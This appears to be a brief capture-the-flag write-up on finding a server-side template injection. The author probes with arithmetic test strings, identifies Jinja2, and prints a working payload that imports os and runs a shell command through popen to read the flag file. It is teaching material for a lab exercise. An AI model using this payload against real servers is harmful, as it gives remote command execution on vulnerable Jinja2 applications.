<img width="1085" height="276" alt="Screenshot 2025-07-27 231022" src="https://github.com/user-attachments/assets/e9d494a5-c0e8-413c-9ed4-0dd2b6f46e46" />
I have to identify what template does this website use with [PortSwigger resource](https://portswigger.net/web-security/server-side-template-injection) ,specifically in the  `identify` section

These are payloads that I tried with the input prompt which worked
- `${{7*7}}`
- `${{7*'7'}}`

Then I concluded that the server template is `jinja2` and found this page with useful payloads
[Server Side Template Injection with jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

Payloads:
-> {{request.application.__globals__.__builtins__.__import__('os').popen('`command to inject`').read()}}

Complete payload
=> {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
